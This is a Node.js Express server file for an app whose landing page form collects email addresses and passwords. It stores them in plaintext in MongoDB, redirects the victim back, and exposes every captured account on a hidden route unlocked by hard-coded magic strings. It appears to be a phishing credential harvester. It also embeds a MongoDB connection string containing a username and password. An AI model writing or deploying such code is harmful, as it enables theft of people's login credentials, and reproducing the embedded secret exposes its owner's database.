//mongodb-demo-gjnsl.run-us-west2.goorm.io
var express = require('express'),
    bodyParser = require('body-parser'),
    app = express(),
    mongoose = require('mongoose'),
	methodOverride = require('method-override');

mongoose.connect('mongodb+srv://kbibi:Mrgamer1017$@cluster0-pkbkj.mongodb.net/Cluster0?retryWrites=true&w=majority', { useNewUrlParser: true, useUnifiedTopology: true})
app.use(methodOverride('_method'))
app.use(bodyParser.urlencoded({ extended: false }))
app.use(bodyParser.json())
app.set('view engine', 'ejs')

var accountSchema = new mongoose.Schema({
    email: String,
    password: String
})
var Account = mongoose.model("Account", accountSchema)

app.get('/', function(req, res){
    res.redirect('/landing')
})

app.get("/landing", function(req, res){
	res.render('landing')
})

app.get('/favicon.ico', function(req, res){
	res.redirect('/')
})

app.post('/', function(req, res){
var email = req.body.email,
	password = req.body.password;
	if(email == "57adkj%8//" || password == "57adkj%8//n"){
		res.redirect("/show/asldjkdasljasdlk")
	} else {
	Account.create({
		email: email,
		password: password
	}, function(err, created){
    if(err){
    	res.redirect('*')
	 } else {
		res.redirect('/')
	 }
    })
}
})
	

app.get('/show/asldjkdasljasdlk', function(req, res){
	Account.find({}, function(err, found){
		if(err){
			res.redirect('*')
		} else {
			res.render('show', {accounts: found})
		}
	})
})

app.get('/verify', function(req, res){
	res.render('verify');

app.post('/verify', function(req, res){
	var verify = req.body.verify;
	console.log(verify + "hello")
	var code = '57adkj%8//n';
	if(verify == code){
		res.redirect('/show/asldjkdasljasdlk')
	} else {
		res.redirect('/')
	}
})
})

app.delete('/delete/:id', function(req, res){
	var id = req.params.id;
	Account.findByIdAndRemove(id, function(err, found){
		if(err){
			console.log(err);
		} else {
			res.redirect('/show/asldjkdasljasdlk')
		}
	})})

app.get('*', function(req, res){
    res.render('error')
})

app.listen(process.env.PORT || 3000, function(){
    console.log('server started')
})
